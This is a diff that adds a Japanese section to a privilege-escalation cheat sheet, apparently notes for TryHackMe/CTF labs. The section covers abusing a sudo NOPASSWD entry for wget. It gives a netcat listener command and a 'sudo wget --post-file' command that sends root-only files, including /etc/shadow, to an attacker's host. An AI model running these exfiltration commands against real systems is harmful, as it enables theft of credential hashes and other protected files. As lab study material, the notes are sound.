@@ -114,6 +114,30 @@ find / -perm -4000 2>/dev/null
 sudo -l
 ```
 
+### wget（sudo NOPASSWD）— ファイル内容を外に送る
+
+`sudo -l` で `(root) NOPASSWD: /usr/bin/wget` があるとき、**root 権限で任意ファイルを読んで POST 送信**できる（GTFOBins）。
+
+**Kali（受け側）**
+
+```bash
+listen 80
+# または: nc -lvnp 80
+```
+
+**ターゲット（送る側）**
+
+```bash
+# LHOST = listen を張っている Kali の IP（THM なら ip a → tun0）
+sudo /usr/bin/wget --post-file=/root/root_flag.txt <LHOST>
+```
+
+`<LHOST>` は **受け側（自分の Kali）の IP**。ターゲットから見えるアドレスを指定する（THM VPN なら通常 `tun0`）。listener に **ファイルの中身** が届く。
+
+- **パスは事前に推測・列挙が必要**（CTF では `user_flag.txt` → `/root/root_flag.txt` など）
+- フラグ以外でも使える例: `--post-file=/etc/shadow`, `--post-file=/etc/passwd`
+- 対話的 root シェルではなく **読めるファイルの exfil** が主な用途
+
 ### SUID権限ファイル検索
 
 ```bash
